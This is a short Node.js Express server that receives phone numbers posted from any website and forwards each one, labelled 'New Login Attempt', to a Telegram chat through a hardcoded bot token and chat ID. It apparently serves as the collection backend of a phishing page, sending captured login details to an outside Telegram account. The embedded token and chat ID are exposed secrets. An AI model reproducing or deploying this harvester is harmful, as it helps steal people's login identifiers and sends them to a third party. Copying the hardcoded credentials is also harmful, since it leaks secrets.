const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

// Your Telegram bot info
const BOT_TOKEN = "8504129347:AAHFP1FoTkxKdR0ErCwxNUxUP40G7i-ndEY";
const CHAT_ID = "8140159923";

app.post("/send", async (req, res) => {
    const { phone } = req.body;

    if (!phone) {
        return res.status(400).json({ error: "Phone number missing" });
    }

    const text = `📱 New Login Attempt:\nPhone: ${phone}`;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text
        });

        res.json({ success: true });
    } catch (error) {
        console.error("Telegram Error:", error);
        res.status(500).json({ error: "Telegram failed" });
    }
});

app.get("/", (req, res) => {
    res.send("Backend working!");
});

app.listen(3000, () => {
    console.log("Server running on port 3000");
});
